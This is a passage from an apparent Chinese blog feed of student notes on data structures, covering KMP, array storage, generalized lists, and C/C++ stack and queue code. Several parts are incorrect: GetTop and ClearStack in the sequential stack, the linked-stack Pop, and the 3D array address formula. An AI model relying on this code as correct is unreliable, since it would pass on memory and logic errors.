class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, sub);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>注意事项</p><ul><li>注意回溯的<code>i</code>的计算公式</li></ul></li></ol><h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><ol><li><p>计算<code>next</code>的值</p><ul><li>第一个元素<code>next</code>为<code>0</code></li><li>第二个元素<code>next</code>比较前面一个元素，就是<code>1</code></li><li>其他元素比较前缀的子串</li></ul><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/KMP%E7%AE%97%E6%B3%95%E7%9A%84next%E5%80%BC%E7%9A%84%E8%BF%90%E7%AE%97.png"></p></li><li></li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol><li><p>定长的线性表</p></li><li><p>相同的元素</p></li><li></li><li><p>结构是固定</p></li><li><p>三维数组的存储</p><p>例如<code>arr[i][j][k]</code></p><ul><li><p><code>arr[x][y][z]</code></p><p>意思就是说，第<code>z</code>页的第<code>x,y</code>号元素</p><p>内存为<code>arr+z*x*y+x*y+y</code></p></li></ul></li><li><p>稀疏矩阵的存储</p><p>采用三元法(i,j,元素)</p><p>既是只存放有元素的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%89%E5%85%83%E7%BB%84%E6%B3%95%E4%BC%98%E7%BC%BA%E7%82%B9.png"></p></li><li><p>三角矩阵</p><p>采用的是存一边的方法</p></li><li><p>对称矩阵</p><p>采用三角矩阵的存法</p></li></ol><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p><ol><li><p>每个元素可以不同</p></li><li><p>一般用大写的字母表示广义表，小写的字母表示表的元素</p></li><li><p>递归的广义表</p></li><li><p>广义表的深度</p><p>可以大概理解为，完整括号的个数</p></li><li><p>广义表的性质</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li><li><p>广义表的种类</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li></ol><h2 id="案例分析与实现"><a href="#案例分析与实现" class="headerlink" title="案例分析与实现"></a>案例分析与实现</h2><ol><li><p>病毒感染检测</p><ul><li><p>将病毒的遗传物质变成复制一份（考虑到病毒的遗传物质是环状的）</p></li><li><p>代码示例（病毒DNA是线状的）</p><p>使用BF</p><p>[代码](<a href="https://github.com/TSY244/cpp_test/commit/82838186490cbdfacb47899ecf70487a44ab4e53">病毒匹配bf · TSY244&#x2F;cpp_test@8283818 (github.com)</a>)</p></li></ul><p>，</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈和队列</title>
    <link href="/2023/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <url>/2023/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="栈定义和特点"><a href="#栈定义和特点" class="headerlink" title="栈定义和特点"></a>栈定义和特点</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ol><li>栈：先进后出</li><li>队列：先进先出（排队的问题）</li></ol><h3 id="顺序栈的表示和操作实现"><a href="#顺序栈的表示和操作实现" class="headerlink" title="顺序栈的表示和操作实现"></a>顺序栈的表示和操作实现</h3><ol><li>约定<code>an</code>端为栈顶，<code>a1</code>端为栈底</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li><p>初始化   制造一个空栈</p><p><code>InitStack(&amp;S)</code></p></li><li><p>销毁栈   </p><p><code>DestroyStack(&amp;S)</code></p></li><li><p>判断是否为空</p><p><code>StackEmpty(S)</code></p></li><li><p>求栈的长度</p><p><code>StackLength(S)</code></p></li><li><p>取栈顶的元素</p><p><code>GetTop(S,&amp;e)</code></p></li><li><p>栈的置空操作</p><p><code>ClearStack(&amp;S)</code></p></li><li><p>入栈操作</p><p><code>Push(&amp;S,e)</code></p></li><li><p>出栈操作</p><p><code>Pop(&amp;S,&amp;e)</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png"></p></li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><ol><li><p>两个指针，一个<code>top</code>指向的是真正的栈顶的上面一个指针，一个<code>base</code>指向的是栈底的地址</p></li><li><p>空栈的标志</p><p><code>top</code>和<code>base</code>都指向的是<code>0</code> </p></li><li><p>栈满的标志</p><p><code>top</code>-<code>base</code>&#x3D;&#x3D;<code>stacksize</code> </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E6%A0%88%E7%9A%84%E8%A1%A8%E7%A4%BA.png"></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType* base;<br>    ElemType* top;<br>    <span class="hljs-type">int</span> stackSize;<br>&#125;SqStack;<br><br>status <span class="hljs-title function_">destroyStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(sqStack-&gt;base);<br>    sqStack-&gt;stackSize=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">initStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    sqStack-&gt;base=(ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (ElemType)*MAXSIZE);<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    &#125;<br>    sqStack-&gt;top=sqStack-&gt;base;<br>    sqStack-&gt;stackSize=MAXSIZE;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==sqStack.top)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">StackLength</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sqStack.top-sqStack.base;<br>&#125;<br><br>status <span class="hljs-title function_">GetTop</span><span class="hljs-params">(SqStack sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*sqStack.top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">ClearStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    sqStack-&gt;base=sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack* sqStack,ElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>||sqStack-&gt;top-sqStack-&gt;base==sqStack-&gt;stackSize)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *sqStack-&gt;top++=e;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack* sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>|| sqStack-&gt;base==sqStack-&gt;top)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*--sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatSqStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        Push(sqStack,i+<span class="hljs-number">20</span>);<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">printfStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem;<br>    <span class="hljs-keyword">while</span>(StackLength(*sqStack)&gt;<span class="hljs-number">0</span>)&#123;<br>        Pop(sqStack,&amp;tem);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, tem);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    SqStack sqStack;<br>    sqStack.base=<span class="hljs-literal">NULL</span>;<br>    initStack(&amp;sqStack);<br>    CreatSqStack(&amp;sqStack);<br>    printfStack(&amp;sqStack);<br>    destroyStack(&amp;sqStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="栈链的表示和实现"><a href="#栈链的表示和实现" class="headerlink" title="栈链的表示和实现"></a>栈链的表示和实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>* <span class="hljs-title">next</span>;</span><br>&#125;StackNode,*LinkStack;<br><br><br>status <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-comment">//构造空栈</span><br>    *linkStack=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(LinkStack linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack* linkStack,ElemType e)</span>&#123;<br>    StackNode* temNode=(StackNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(StackNode));<br>    temNode-&gt;data=e;<br>    <span class="hljs-comment">//如果是第一个元素，下面代码指向的NULL</span><br>    temNode-&gt;next=(*linkStack);<br>    (*linkStack)=temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">Pop</span><span class="hljs-params">(LinkStack* linkStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=(*linkStack)-&gt;data;<br>    (*linkStack)=(*linkStack)-&gt;next;<br><br>&#125;<br>status <span class="hljs-title function_">DestroyStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    StackNode* deleteNode=(*linkStack);<br>    <span class="hljs-keyword">while</span>(deleteNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        (*linkStack)=(*linkStack)-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode=<span class="hljs-literal">NULL</span>;<br>        deleteNode=(*linkStack);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>ElemType <span class="hljs-title function_">GetTop</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>((*linkStack)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (*linkStack)-&gt;data;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    LinkStack linkStack=<span class="hljs-literal">NULL</span>;<br>    InitStack(&amp;linkStack);<br>    <span class="hljs-type">int</span> e1=<span class="hljs-number">244</span>,e2=<span class="hljs-number">0</span>;<br>    Push(&amp;linkStack,e1);<br>    Pop(&amp;linkStack,&amp;e2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e2);<br>    Push(&amp;linkStack,<span class="hljs-number">24</span>);<br>    e1= GetTop(&amp;linkStack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e1);<br>    DestroyStack(&amp;linkStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="栈与递归"><a href="#栈与递归" class="headerlink" title="栈与递归"></a>栈与递归</h3><ol><li><p>主调函数和被调函数</p><p>如：<code>main</code>函数就是主调函数，在里面调用的函数被称为被调函数</p></li><li><p>函数的嵌套调用的方式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%87%BD%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E7%90%86.png"></p></li></ol><h2 id="队列的表示和操作原理"><a href="#队列的表示和操作原理" class="headerlink" title="队列的表示和操作原理"></a>队列的表示和操作原理</h2><ol><li>只能在表尾经行插入操作，在表头进行删除操作的线性表</li><li>先进先出的线性表</li><li>有顺序结构和链式结构（常用的是顺序结构）</li></ol><h3 id="队列的相关操作"><a href="#队列的相关操作" class="headerlink" title="队列的相关操作"></a>队列的相关操作</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C.png"></p><h3 id="队列的顺序表示和实现"><a href="#队列的顺序表示和实现" class="headerlink" title="队列的顺序表示和实现"></a>队列的顺序表示和实现</h3><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93.png"></p><ol><li><p>对空的表示</p><p><code>front</code>&#x3D;<code>rear</code>&#x3D;<code>0</code></p></li><li><p>队列的特殊情况</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\栈和队列.assets\image-20230402182219032.png"></p></li><li><p>假溢出和真溢出</p><ul><li><p>假溢出</p><p><code>rear</code>!&#x3D;<code>0</code></p><p><code>rear</code>&#x3D;<code>MAXQSIZE</code> 但是队列中还有空余的存储空间</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%81%87%E6%BA%A2%E5%87%BA.png"></p></li><li><p>真溢出</p><p><code>rear</code>&#x3D;<code>0</code></p><p><code>fear</code>&#x3D;<code>MAXQSIZE</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E7%9C%9F%E6%BA%A2%E5%87%BA.png"></p></li></ul></li><li><p>循环队列的处理逻辑</p><ul><li><p>使用<code>%</code>运算，将数组变成循环 </p></li><li><p>但是用循环队列的是时候，我们面对的是对空和对满是一种判断条件，所以我们使用标志经行判断</p><p>一下提出三种解决办法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/%E4%B8%89%E7%A7%8D%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.png"></p></li></ul></li><li><p>头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><span class="hljs-keyword">using</span> ElemType=<span class="hljs-type">int</span>;<br><span class="hljs-keyword">using</span> status=<span class="hljs-type">int</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> ERROR=<span class="hljs-number">-1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXSIZE=<span class="hljs-number">10</span>;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Que</span>&#123;<br><br><span class="hljs-keyword">private</span>:<br>    ElemType* base;<br>    <span class="hljs-type">int</span> front;<span class="hljs-comment">//地址更小的指针</span><br>    <span class="hljs-type">int</span> rear;<span class="hljs-comment">//地址更大的指针</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Que</span>();<br>    ~<span class="hljs-built_in">Que</span>();<br>    <span class="hljs-function">status <span class="hljs-title">ClearQueue</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueLength</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">GetHead</span><span class="hljs-params">(ElemType&amp; e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">EnQueue</span><span class="hljs-params">(ElemType e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span></span>;<br>&#125;;<br><br></code></pre></td></tr></table></figure></li><li><p>类的实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>Que::<span class="hljs-built_in">Que</span>() &#123;<br>    base= <span class="hljs-literal">nullptr</span>;<br>    base=<span class="hljs-keyword">new</span> ElemType [MAXSIZE];<br>    <span class="hljs-keyword">if</span>(base== <span class="hljs-literal">nullptr</span>)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;base new ERROR&quot;</span>&lt;&lt;std::endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><br>Que::~<span class="hljs-built_in">Que</span>() &#123;<br>    <span class="hljs-keyword">delete</span>[] base;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Que::status Que::ClearQueue() &#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    return 0;</span><br><span class="hljs-comment">&#125;*/</span><br><br><span class="hljs-comment">//这个算法需要想清楚</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Que::QueueLength</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (rear-front+MAXSIZE)%MAXSIZE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::GetHead</span><span class="hljs-params">(ElemType &amp;e)</span> 